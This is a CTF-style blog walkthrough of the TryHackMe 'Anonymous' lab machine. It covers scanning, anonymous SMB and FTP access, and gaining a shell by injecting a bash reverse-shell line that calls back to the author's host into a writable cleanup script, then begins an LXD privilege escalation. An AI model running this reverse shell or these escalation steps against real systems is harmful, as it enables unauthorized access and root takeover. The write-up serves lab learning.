<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="theme" content="Chirpy v2.5.1"><meta name="generator" content="Jekyll v4.1.1" /><meta property="og:title" content="Writeup - Anonymous" /><meta name="author" content="Fr3akazo1d!" /><meta property="og:locale" content="en_US" /><meta name="description" content="Walkthrough of Anonymous of TryHackme" /><meta property="og:description" content="Walkthrough of Anonymous of TryHackme" /><link rel="canonical" href="protocol://domain/posts/thm-Anonymous-Writeup/" /><meta property="og:url" content="protocol://domain/posts/thm-Anonymous-Writeup/" /><meta property="og:site_name" content="Fr3akazo1d!" /><meta property="og:image" content="protocol://domain/assets/img/thm-images/THM-Anonymous.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-09-28T00:14:00+02:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="protocol://domain/assets/img/thm-images/THM-Anonymous.png" /><meta property="twitter:title" content="Writeup - Anonymous" /><meta name="twitter:site" content="@twitter_username" /><meta name="twitter:creator" content="@Fr3akazo1d!" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"image":"protocol://domain/assets/img/thm-images/THM-Anonymous.png","url":"protocol://domain/posts/thm-Anonymous-Writeup/","description":"Walkthrough of Anonymous of TryHackme","mainEntityOfPage":{"@type":"WebPage","@id":"protocol://domain/posts/thm-Anonymous-Writeup/"},"@type":"BlogPosting","headline":"Writeup - Anonymous","dateModified":"2020-09-28T00:14:00+02:00","datePublished":"2020-09-28T00:14:00+02:00","author":{"@type":"Person","name":"Fr3akazo1d!"},"@context":"https://schema.org"}</script><title>Writeup - Anonymous | Fr3akazo1d!</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /><link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"> <script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" async></script> <script src="/assets/js/post.min.js" async></script> <script async src="https://www.googletagmanager.com/gtag/js?id="></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); </script> <script src="/app.js" defer></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"> <center><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/sample/freakazoid.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/"><p>Fr3akazo1d!</p></a></div><div class="site-subtitle font-italic"><p>Pen-Testing, Ethical Hacking, Programming.</p></div></div></center></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tools/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-link ml-xl-3 mr-xl-3 unloaded"></i> <span>TOOLS & LINKS</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <a href="https://github.com/fr3akazo1d" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/twitter_username" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['fr3akazo1d','protonmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Writeup - Anonymous</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Writeup - Anonymous</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Mon, Sep 28, 2020, 12:14 AM +0200" > Sep 28 <i class="unloaded">2020-09-28T00:14:00+02:00</i> </span> by <span class="author"> Fr3akazo1d! </span></div></div><div class="post-content"> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/thm-images/THM-Anonymous.png" class="post-preview-img"><h1 id="general-information">General Information</h1><div class="table-wrapper"><table><thead><tr><th>Room<th>Date<th>Difficulty<th>Tags<th>Time<tbody><tr><td>Anonymous<td>27.09.2020<td>Medium<td>Security, linux, permissions, medium<td>2h</table></div><h1 id="used-programs">Used Programs</h1><div class="table-wrapper"><table><thead><tr><th>Program<th>Command<tbody><tr><td>rustscan<td>rustscan $ip –ulimit 5000 – -sC -sV -oN nmap/initial tee output<tr><td>smbclient<td>smbclient -L 10.10.195.20<tr><td>ftp<td>ftp 10.10.195.20</table></div><h1 id="tryhackme---answers">TryHackMe - Answers:</h1><hr /><h2 id="1-enumerate-the-machine-how-many-ports-are-open">1 Enumerate the machine. How many ports are open?</h2><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>4
</pre></table></code></div></div><h2 id="2-what-service-is-running-on-port-21">2 What service is running on port 21?</h2><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>ftp
</pre></table></code></div></div><h2 id="3-what-service-is-running-on-ports-139-and-445">3 What service is running on ports 139 and 445?</h2><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>smb
</pre></table></code></div></div><h2 id="4-theres-a-share-on-the-users-computer-whats-it-called">4 There’s a share on the user’s computer. What’s it called?</h2><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>pics
</pre></table></code></div></div><h2 id="5-usertxt">5 user.txt</h2><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>9******************************0
</pre></table></code></div></div><h2 id="6-roottxt">6 root.txt</h2><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>4******************************3
</pre></table></code></div></div><hr /><h1 id="walkthrough">Walkthrough:</h1><p>The first thing i always do is a NMAP-Scan on the target machine. I used the Program “Rustscan”.</p><p>The rustscan command which i used was:</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>rustscan 10.10.195.20 | <span class="nb">tee </span>rustscan-output.txt
</pre></table></code></div></div><p>Below the output of the Rustscan.</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
</pre><td class="rouge-code"><pre>File: rustscan-output.txt
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
   2   │ | <span class="o">{}</span>  <span class="o">}</span>| <span class="o">{</span> <span class="o">}</span> |<span class="o">{</span> <span class="o">{</span>__ <span class="o">{</span>_   _<span class="o">}{</span> <span class="o">{</span>__  /  ___<span class="o">}</span> / <span class="o">{}</span> <span class="se">\ </span>|  <span class="sb">`</span>| |
   3   │ | .-. <span class="se">\|</span> <span class="o">{</span>_<span class="o">}</span> |.-._<span class="o">}</span> <span class="o">}</span> | |  .-._<span class="o">}</span> <span class="o">}</span><span class="se">\ </span>    <span class="o">}</span>/  /<span class="se">\ </span> <span class="se">\|</span> |<span class="se">\ </span> |
   4   │ <span class="sb">`</span>-<span class="s1">' `-'</span><span class="sb">`</span><span class="nt">-----</span><span class="s1">'`----'</span>  <span class="sb">`</span>-<span class="s1">'  `----'</span>  <span class="sb">`</span><span class="nt">---</span><span class="s1">' `-'</span>  <span class="sb">`</span>-<span class="s1">'`-'</span> <span class="sb">`</span>-<span class="s1">'
   5   │ Faster Nmap scanning with Rust.
   6   │ ________________________________________
   7   │ : https://discord.gg/GFrQsGy           :
   8   │ : https://github.com/RustScan/RustScan :
   9   │  --------------------------------------
  10   │ 🌍HACK THE PLANET🌍
  11   │ 
  12   │ [~] The config file is expected to be at "/home/fr3akazo1d/.rustscan.toml"
  13   │ [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive s
       │ ervers
  14   │ [!] Your file limit is very small, which negatively impacts RustScan'</span>s speed. Use the Docker image, or up the
       │  Ulimit with <span class="s1">'--ulimit 5000'</span><span class="nb">.</span> 
  15   │ Open 10.10.195.20:21
  16   │ Open 10.10.195.20:139
  17   │ Open 10.10.195.20:22
  18   │ Open 10.10.195.20:445
  19   │ <span class="o">[</span>~] Starting Nmap
  20   │ <span class="o">[&gt;]</span> The Nmap <span class="nb">command </span>to be run is nmap <span class="nt">-vvv</span> <span class="nt">-p</span> 21,139,22,445 10.10.195.20
  21   │ 
  22   │ Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-09-27 21:18 CEST
  23   │ Initiating Ping Scan at 21:18
  24   │ Scanning 10.10.195.20 <span class="o">[</span>2 ports]
  25   │ Completed Ping Scan at 21:18, 0.08s elapsed <span class="o">(</span>1 total hosts<span class="o">)</span>
  26   │ Initiating Parallel DNS resolution of 1 host. at 21:18
  27   │ Completed Parallel DNS resolution of 1 host. at 21:18, 0.03s elapsed
  28   │ DNS resolution of 1 IPs took 0.03s. Mode: Async <span class="o">[</span><span class="c">#: 3, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]</span>
  29   │ Initiating Connect Scan at 21:18
  30   │ Scanning 10.10.195.20 <span class="o">[</span>4 ports]
  31   │ Discovered open port 139/tcp on 10.10.195.20
  32   │ Discovered open port 445/tcp on 10.10.195.20
  33   │ Discovered open port 22/tcp on 10.10.195.20
  34   │ Discovered open port 21/tcp on 10.10.195.20
  35   │ Completed Connect Scan at 21:18, 0.07s elapsed <span class="o">(</span>4 total ports<span class="o">)</span>
  36   │ Nmap scan report <span class="k">for </span>10.10.195.20
  37   │ Host is up, received conn-refused <span class="o">(</span>0.080s latency<span class="o">)</span><span class="nb">.</span>
  38   │ Scanned at 2020-09-27 21:18:25 CEST <span class="k">for </span>0s
  39   │ 
  40   │ PORT    STATE SERVICE      REASON
  41   │ 21/tcp  open  ftp          syn-ack
  42   │ 22/tcp  open  ssh          syn-ack
  43   │ 139/tcp open  netbios-ssn  syn-ack
  44   │ 445/tcp open  microsoft-ds syn-ack
  45   │ 
  46   │ Read data files from: /usr/bin/../share/nmap
  47   │ Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>0.22 seconds
</pre></table></code></div></div><p>As in the output we can see, that we have 4 Ports open:</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>  40   │ PORT    STATE SERVICE      REASON
  41   │ 21/tcp  open  ftp          syn-ack
  42   │ 22/tcp  open  ssh          syn-ack
  43   │ 139/tcp open  netbios-ssn  syn-ack
  44   │ 445/tcp open  microsoft-ds syn-ack
</pre></table></code></div></div><h2 id="enumerate-smb-share">Enumerate SMB-Share</h2><p>The first Port i have explored was 139/445 SMB. With the command “smbclient -L 10.10.195.20” we enummerate the services witch a available on the server.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>-L|--list
This option allows you to look at what services are available on a server. You use it as smbclient -L host and a list should appear. The -I option may be useful if your NetBIOS names don't match your TCP/IP DNS host names or if you are trying to reach a host on another network.
</pre></table></code></div></div><p>This give us this Infromation:</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>smbclient <span class="nt">-L</span> 10.10.195.20
Enter WORKGROUP<span class="se">\f</span>r3akazo1d<span class="s1">'s password: 

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	pics            Disk      My SMB Share Directory for Pics
	IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
</span></pre></table></code></div></div><p>With this infromation, i tried to connect to the “pics” share on the server.</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre>smbclient <span class="se">\\\\</span>10.10.195.20<span class="se">\\</span>pics
Enter WORKGROUP<span class="se">\f</span>r3akazo1d<span class="s1">'s password: 
Try "help" to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Sun May 17 13:11:34 2020
  ..                                  D        0  Sun Sep 27 21:48:54 2020
  corgo2.jpg                          N    42663  Tue May 12 02:43:42 2020
  puppos.jpeg                         N   265188  Tue May 12 02:43:42 2020

		20508240 blocks of size 1024. 13289716 blocks available
smb: \&gt;
copied the files to my local machine:

smb: \&gt; get corog2.jpg
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \corog2.jpg
smb: \&gt; get corgo2.jpg
getting file \corgo2.jpg of size 42663 as corgo2.jpg (94.9 KiloBytes/sec) (average 94.9 KiloBytes/sec)
smb: \&gt; get puppos.jpeg
getting file \puppos.jpeg of size 265188 as puppos.jpeg (315.1 KiloBytes/sec) (average 238.4 KiloBytes/sec)
smb: \&gt; 
</span></pre></table></code></div></div><p>This connection was successfully. The connection was done without any password and username. Analyzed the two files with steghide. there are some files behind. but i don’t get the passphrase for the files. These are only pictures of dogs…</p><h2 id="enumerate-ftp-share">Enumerate FTP-Share</h2><p>The next step was to enumerate the FTP-Share. Maybe we have better luck on this Server.</p><p>I tried the “anonymous” login on the FTP-Share.</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre>ftp 10.10.195.20
Connected to 10.10.195.20.
220 NamelessOne<span class="s1">'s FTP Server!
Name (10.10.195.20:fr3akazo1d): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
lets check what is on this ftp share:

ftp&gt; ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 Jun 04 19:26 scripts
226 Directory send OK.
tp&gt; cd scripts
250 Directory successfully changed.
ftp&gt; ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxr-xrwx    1 1000     1000          364 Sep 27 19:39 clean.sh
-rw-rw-r--    1 1000     1000         4257 Sep 27 20:24 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12 03:50 to_do.txt
226 Directory send OK.
</span></pre></table></code></div></div><p>Anonymous login was successfully so i have checked the files on the FTP-Share. In the folder “scripts” there are three files listed.</p><ol><li>clean.sh<li>removed_files.log<li>to_do.txt</ol><p>Lets check out what is in this files:</p><p>clean.sh</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre>bat clean.sh         
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: clean.sh
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ <span class="c">#!/bin/bash</span>
   2   │ 
   3   │ <span class="nv">tmp_files</span><span class="o">=</span>0
   4   │ <span class="nb">echo</span> <span class="nv">$tmp_files</span>
   5   │ <span class="k">if</span> <span class="o">[</span> <span class="nv">$tmp_files</span><span class="o">=</span>0 <span class="o">]</span>
   6   │ <span class="k">then
   </span>7   │         <span class="nb">echo</span> <span class="s2">"Running cleanup script:  nothing to delete"</span> <span class="o">&gt;&gt;</span> /var/ftp/scripts/removed_files.log
   9   │ <span class="k">else
  </span>10   │     <span class="k">for </span>LINE <span class="k">in</span> <span class="nv">$tmp_files</span><span class="p">;</span> <span class="k">do
  </span>11   │         <span class="nb">rm</span> <span class="nt">-rf</span> /tmp/<span class="nv">$LINE</span> <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">"</span><span class="si">$(</span><span class="nb">date</span><span class="si">)</span><span class="s2"> | Removed file /tmp/</span><span class="nv">$LINE</span><span class="s2">"</span> <span class="o">&gt;&gt;</span> /var/ftp/scripts/removed_files
       │ .log<span class="p">;</span><span class="k">done
  </span>12   │ <span class="k">fi</span>
</pre></table></code></div></div><p>So this file is interessting because, this is somehow removing some files on the target machine. Maybe we can change the code in the file an rerun the scirpt on the target.</p><p>removed_files.log</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>bat removed_files.log 
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: removed_files.log
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ Running cleanup script:  nothing to delete
   2   │ Running cleanup script:  nothing to delete
   3   │ Running cleanup script:  nothing to delete
   4   │ Running cleanup script:  nothing to delete
   5   │ Running cleanup script:  nothing to delete
   6   │ Running cleanup script:  nothing to delete
   7   │ Running cleanup script:  nothing to delete
   8   │ Running cleanup script:  nothing to delete
   9   │ Running cleanup script:  nothing to delete
   ....
</pre></table></code></div></div><p>This is only a log file, when some files are removed it will stored in this file.</p><p>to_do.txt</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>bat to_do.txt        
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: to_do.txt
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ I really need to disable the anonymous login...it<span class="s1">'s really not safe
</span></pre></table></code></div></div><p>Ok, yes, the anonymous login should be removed from the FTP-Server. Something bad can happend. :)</p><p>Now lets focus on the “clean.sh” Maybe we can add a reverse shell in the bash script. We cann add a bash reverse-shell into the file.</p><p>Found on Pentest-Monkey a reverse-shell witch should work:</p><p><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" title="Reverse-Shell">Reverse Shell Cheat Sheet</a></p><p>Added the code in line 8 of the “clean.sh” script. Change the IP-Address to my local address and a port.</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>bat clean.sh         
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: clean.sh
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ <span class="c">#!/bin/bash</span>
   2   │ 
   3   │ <span class="nv">tmp_files</span><span class="o">=</span>0
   4   │ <span class="nb">echo</span> <span class="nv">$tmp_files</span>
   5   │ <span class="k">if</span> <span class="o">[</span> <span class="nv">$tmp_files</span><span class="o">=</span>0 <span class="o">]</span>
   6   │ <span class="k">then
   </span>7   │         <span class="nb">echo</span> <span class="s2">"Running cleanup script:  nothing to delete"</span> <span class="o">&gt;&gt;</span> /var/ftp/scripts/removed_files.log
   8   │         bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/1<span class="k">*</span>.1<span class="k">*</span>.3.1<span class="k">**</span>/8080 0&gt;&amp;1
   9   │ <span class="k">else
  </span>10   │     <span class="k">for </span>LINE <span class="k">in</span> <span class="nv">$tmp_files</span><span class="p">;</span> <span class="k">do
  </span>11   │         <span class="nb">rm</span> <span class="nt">-rf</span> /tmp/<span class="nv">$LINE</span> <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">"</span><span class="si">$(</span><span class="nb">date</span><span class="si">)</span><span class="s2"> | Removed file /tmp/</span><span class="nv">$LINE</span><span class="s2">"</span> <span class="o">&gt;&gt;</span> /var/ftp/scripts/removed_files
       │ .log<span class="p">;</span><span class="k">done
  </span>12   │ <span class="k">fi</span>
</pre></table></code></div></div><p>In another terminal i started a Netcat Listener on port 8080: “nc -lnvp 8080”</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>nc <span class="nt">-lnvp</span> 8080
listening on <span class="o">[</span>any] 8080 ...
</pre></table></code></div></div><p>and after a few seconds i got a shell on the target:</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>nc <span class="nt">-lnvp</span> 8080
listening on <span class="o">[</span>any] 8080 ...
connect to <span class="o">[</span>10.11.3.139] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.195.20] 53182
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>2584<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
namelessone@anonymous:~<span class="err">$</span>
</pre></table></code></div></div><p>In this shell we can now read the User-flag.</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>namelessone@anonymous:~<span class="nv">$ </span><span class="nb">ls
ls
</span>pics
user.txt
namelessone@anonymous:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
<span class="nb">cat </span>user.txt
9<span class="k">******************************</span>0
</pre></table></code></div></div><p>So half way done on the target. Now we want root access on the client. :)</p><h2 id="privilage-escalation">Privilage-Escalation</h2><p>For my Privilage-Escalation i exploit the LXD-Vulnerability on the target.</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>namelessone@anonymous:~<span class="nv">$ </span><span class="nb">id
id
</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>namelessone<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>namelessone<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>namelessone<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,27<span class="o">(</span><span class="nb">sudo</span><span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,108<span class="o">(</span>lxd<span class="o">)</span>
</pre></table></code></div></div><p>The command “id” shows me that the user is in the LXD-Group. LXD is a container software manager. Its like Doker.</p><p>There is a Vulnerability of the LXD-Container:</p><p><a href="https://www.exploit-db.com/exploits/46978">Exploit-DB-LXD-Vulnerability</a></p><p>For the Exploitation i followed the steps in the Command section of the file:</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="c"># Step 1: Download build-alpine =&gt; wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine [Attacker Machine]</span>
<span class="c"># Step 2: Build alpine =&gt; bash build-alpine (as root user) [Attacker Machine]</span>
<span class="c"># Step 3: Run this script and you will get root [Victim Machine]</span>
<span class="c"># Step 4: Once inside the container, navigate to /mnt/root to see all resources from the host machine</span>
